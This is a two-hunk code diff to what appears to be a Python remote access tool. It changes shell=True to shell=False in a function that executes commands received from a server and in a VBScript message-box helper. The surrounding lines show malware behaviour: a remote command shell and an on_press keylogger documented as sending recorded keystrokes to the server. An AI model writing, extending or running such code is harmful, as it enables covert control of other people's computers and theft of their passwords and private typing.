@@ -205,7 +205,7 @@ def command_shell():
 
             # Execute Command and store stdout, stderr and stdin
             objCommand = subprocess.Popen(
-                strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE ,shell=True)
+                strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE ,shell=False)
 
             # Get out stdout and stderr from executed command
             strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode('utf-8', errors='replace')
@@ -264,7 +264,7 @@ def MessageBox(message):
     objVBS.write(f'MsgBox "{message}", {vbOkOnly} + {vbInformation} + {vbSystemModal}, "Message"')
     objVBS.close()
 
-    subprocess.Popen(['cscript', TMP + "/m.vbs"], shell=True)
+    subprocess.Popen(['cscript', TMP + "/m.vbs"], shell=False)
 
 def on_press(key_press):
     """ Define function to record keys being pressed, and send them to the server.
